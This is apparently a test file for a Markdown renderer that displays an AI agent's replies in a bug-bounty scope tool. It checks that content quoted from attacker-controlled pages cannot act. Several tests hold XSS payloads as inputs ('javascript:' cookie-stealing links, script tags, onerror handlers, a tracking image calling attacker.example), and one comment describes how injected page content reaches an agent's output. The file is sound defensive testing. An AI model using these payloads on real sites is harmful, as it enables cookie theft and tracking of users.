/**
 * Agent prose as markdown, read back as a DOM rather than as a string.
 *
 * The claims worth making here are about **elements**: that a `<script>` in agent text is
 * not one, that a `javascript:` link has no `href`, that a fence's text is exactly what the
 * agent wrote. A string match on serialised HTML can be fooled by the escaping either way,
 * so these mount `Markdown.svelte` — the `{@html}` that the live and replayed rows both
 * use — and query what a browser would have built from it.
 */
import { afterEach, describe, expect, test } from "bun:test";

import Markdown from "../../src/lib/components/Markdown.svelte";
import { memoiseByText } from "../../src/lib/markdown";
import { click, mountInto, type Mounted } from "./dom";

let mounted: Mounted[] = [];
afterEach(() => {
  for (const each of mounted) each.destroy();
  mounted = [];
});

const render = (text: string): HTMLElement => {
  const one = mountInto(Markdown, { text });
  mounted.push(one);
  const root = one.target.querySelector<HTMLElement>(".markdown");
  if (root === null) throw new Error("Markdown rendered no root");
  return root;
};

describe("what an agent writes, rendered", () => {
  test("a GFM table is a table, inside a scroller of its own", () => {
    const root = render(
      [
        "| Asset | In scope |",
        "| --- | :---: |",
        "| `acme.com` | yes |",
        "| `*.dev.acme.com` | no |",
      ].join("\n"),
    );
    const table = root.querySelector("table");
    expect(table).not.toBeNull();
    // The wrapper is what keeps a wide table from setting the thread's width.
    expect(table?.parentElement?.classList.contains("table-wrap")).toBe(true);
    expect(
      [...root.querySelectorAll("th")].map((each) => each.textContent),
    ).toEqual(["Asset", "In scope"]);
    expect(root.querySelectorAll("tbody tr")).toHaveLength(2);
    expect(root.querySelector("td code")?.textContent).toBe("acme.com");
    expect(root.textContent).not.toContain("|");
  });

  test("a fenced block keeps every newline and indent, and its language as a label", () => {
    const tree = ["src/", "├── lib/", "│   └── chat.ts", "    deep.ts"].join(
      "\n",
    );
    const root = render(`The layout:\n\n\`\`\`text\n${tree}\n\`\`\``);
    const pre = root.querySelector("pre");
    expect(pre?.dataset["language"]).toBe("text");
    // Exactly the agent's text, line breaks and leading spaces included.
    expect(pre?.querySelector("code")?.textContent).toBe(`${tree}\n`);
    expect(root.textContent).not.toContain("```");
  });

  test("a nested list nests", () => {
    const root = render("- scope\n  - acme.com\n  - api.acme.com\n- out");
    const outer = root.querySelector(":scope > ul");
    expect(outer?.children).toHaveLength(2);
    const inner = outer?.querySelector("li > ul");
    expect(
      [...(inner?.querySelectorAll("li") ?? [])].map(
        (each) => each.textContent,
      ),
    ).toEqual(["acme.com", "api.acme.com"]);
  });

  test("inline code, emphasis and a heading", () => {
    const root = render(
      "## Found\n\n**Three** are in scope — `acme.com` _and_ more.",
    );
    expect(root.querySelector("h2")?.textContent).toBe("Found");
    expect(root.querySelector("strong")?.textContent).toBe("Three");
    expect(root.querySelector("em")?.textContent).toBe("and");
    expect(root.querySelector("p code")?.textContent).toBe("acme.com");
  });

  test("a link opens elsewhere and hands over neither opener nor referrer", () => {
    const link = render(
      "See [the policy](https://acme.com/security).",
    ).querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://acme.com/security");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });
});

/*
 * The scope importer reads attacker-controlled program pages and quotes them back, so
 * agent prose on this surface is untrusted. See `markdown.ts`.
 */
describe("what a program page can put in an agent's mouth", () => {
  test("a javascript: link is a link to nowhere", () => {
    const root = render("[click](javascript:alert(document.cookie))");
    const link = root.querySelector("a");
    expect(link?.textContent).toBe("click");
    expect(link?.hasAttribute("href")).toBe(false);
    expect(root.innerHTML).not.toContain("javascript:");
  });

  test("a literal <script> is text, not an element", () => {
    const root = render(
      "The page ends with <script>alert(1)</script> inline.\n\n<script>alert(2)</script>",
    );
    expect(root.querySelector("script")).toBeNull();
    // Shown as what the agent quoted, not silently dropped.
    expect(root.textContent).toContain("<script>alert(1)</script>");
    expect(root.textContent).toContain("<script>alert(2)</script>");
  });

  test("an element with a handler is text too", () => {
    const root = render(
      '<img src=x onerror="alert(1)"> and <a href="https://x" onclick="alert(1)">x</a>',
    );
    expect(root.querySelector("img")).toBeNull();
    expect(root.querySelector("[onerror], [onclick]")).toBeNull();
    expect(root.textContent).toContain("onerror");
  });

  test("an image is a link to it, so rendering the reply fetches nothing", () => {
    const root = render(
      "![pixel](https://attacker.example/p.png?who=operator) ![x](javascript:alert(1))",
    );
    expect(root.querySelector("img")).toBeNull();
    const links = [...root.querySelectorAll("a")];
    expect(links.map((each) => each.getAttribute("href"))).toEqual([
      "https://attacker.example/p.png?who=operator",
    ]);
    expect(links[0]?.textContent).toBe("pixel");
    expect(root.innerHTML).not.toContain("javascript:");
  });
});

/*
 * A click on a fragment link is a same-document navigation, and a same-document navigation
 * fires `popstate` — which the shell reads as Back or Forward and answers by re-applying
 * the place, closing the importer and its draft. See `finish` in `markdown.ts`.
 */
describe("agent prose cannot move the app", () => {
  test("an in-page link is its text, and clicking it changes nothing", () => {
    const root = render(
      "Scope is [below](#scope) and noted[^1].\n\n[^1]: From the policy page.",
    );
    expect(root.querySelector('a[href^="#"]')).toBeNull();
    expect(root.querySelector("a")).toBeNull();
    expect(root.textContent).toContain("Scope is below and noted");
    // The reference is still a numbered superscript, and its note is still on screen.
    expect(root.querySelector("p sup")?.textContent).toBe("1");
    expect(root.querySelector(".footnotes li")?.textContent?.trim()).toBe(
      "From the policy page.",
    );
    // The back-reference arrow went nowhere once its target went, so it is gone too.
    expect(root.textContent).not.toContain("↩");

    const before = location.href;
    let traversals = 0;
    const counted = (): void => {
      traversals += 1;
    };
    window.addEventListener("popstate", counted);
    window.addEventListener("hashchange", counted);
    try {
      for (const each of root.querySelectorAll<HTMLElement>("*")) click(each);
    } finally {
      window.removeEventListener("popstate", counted);
      window.removeEventListener("hashchange", counted);
    }
    expect(traversals).toBe(0);
    expect(location.href).toBe(before);
  });

  test("two replies with the same footnote mint no ids to collide", () => {
    const first = render("One[^1].\n\n[^1]: First reply's note.");
    const second = render("Two[^1].\n\n[^1]: Second reply's note.");
    expect(document.querySelectorAll(".markdown [id]")).toHaveLength(0);
    expect(
      document.querySelectorAll(".markdown [aria-describedby]"),
    ).toHaveLength(0);
    // Each note is at the foot of its own reply, not shared through an id.
    expect(first.querySelector(".footnotes li")?.textContent?.trim()).toBe(
      "First reply's note.",
    );
    expect(second.querySelector(".footnotes li")?.textContent?.trim()).toBe(
      "Second reply's note.",
    );
  });
});

describe("the edges of what a reply can be", () => {
  test("an image inside a link is the link's text, not a second link", () => {
    const root = render(
      "[![alt](https://img.example/b.svg)](https://link.example/legit)",
    );
    const links = [...root.querySelectorAll("a")];
    expect(links).toHaveLength(1);
    expect(links[0]?.getAttribute("href")).toBe("https://link.example/legit");
    expect(links[0]?.textContent).toBe("alt");
    expect(root.querySelector("a a")).toBeNull();
    expect(root.innerHTML).not.toContain("img.example");
  });

  test("an image inside an in-page link is still a link to the image", () => {
    const root = render("[![alt](https://img.example/b.svg)](#frag)");
    const links = [...root.querySelectorAll("a")];
    expect(links.map((each) => each.getAttribute("href"))).toEqual([
      "https://img.example/b.svg",
    ]);
  });

  test("an image whose own src is a fragment is text, not a link", () => {
    for (const [text, shown] of [
      ["![alt](#x)", "alt"],
      ["![](#)", "#"],
    ] as const) {
      const root = render(text);
      expect(root.querySelector("a")).toBeNull();
      expect(root.querySelector("img")).toBeNull();
      expect(root.textContent?.trim()).toBe(shown);
    }
    const noted = render("x[^1]\n\n[^1]: ![i](#w)");
    expect(noted.querySelector('a[href^="#"]')).toBeNull();
    expect(noted.querySelector(".footnotes li")?.textContent?.trim()).toBe("i");
  });

  test("text that renders to nothing is shown as written", () => {
    expect(render("[x]: https://acme.com/policy").textContent?.trim()).toBe(
      "[x]: https://acme.com/policy",
    );
    expect(render("[^9]: never referenced").textContent?.trim()).toBe(
      "[^9]: never referenced",
    );
  });

  test("a paragraph or heading left empty is shown as written", () => {
    expect(render("[](#x)").textContent?.trim()).toBe("[](#x)");
    expect(render("# [](#x)").textContent?.trim()).toBe("# [](#x)");
    expect(render("[](#x)").querySelector("a")).toBeNull();
  });

  test("a crafted title in the fallback stays text", () => {
    const root = render('[](#x "<img src=x onerror=alert(1)>")');
    expect(root.querySelector("img")).toBeNull();
    expect(root.querySelector("a")).toBeNull();
    expect(root.textContent?.trim()).toBe(
      '[](#x "<img src=x onerror=alert(1)>")',
    );
  });

  test("a horizontal rule alone is not mistaken for nothing", () => {
    const root = render("---");
    expect(root.querySelector("hr")).not.toBeNull();
    expect(root.textContent?.trim()).toBe("");
  });
});

/*
 * Every frame of live activity rebuilds the rows, and every rebuilt row derives its HTML
 * again. What keeps that from being a parse per reply per frame is the memo, so it is
 * tested against a counting stand-in rather than inferred from timing.
 */
describe("rendering is remembered by text", () => {
  test("the same text twice is rendered once", () => {
    let parses = 0;
    const render = memoiseByText((text) => {
      parses += 1;
      return `<p>${text}</p>`;
    }, 4);
    expect(render("a")).toBe("<p>a</p>");
    expect(render("a")).toBe("<p>a</p>");
    expect(render("b")).toBe("<p>b</p>");
    expect(render("a")).toBe("<p>a</p>");
    expect(parses).toBe(2);
  });

  test("it is bounded, and evicts the least recently used", () => {
    const seen: string[] = [];
    const render = memoiseByText((text) => {
      seen.push(text);
      return text;
    }, 2);
    render("a");
    render("b");
    render("a"); // a is now the most recent
    render("c"); // evicts b
    render("a"); // still kept
    render("b"); // gone, rendered again
    expect(seen).toEqual(["a", "b", "c", "b"]);
  });
});
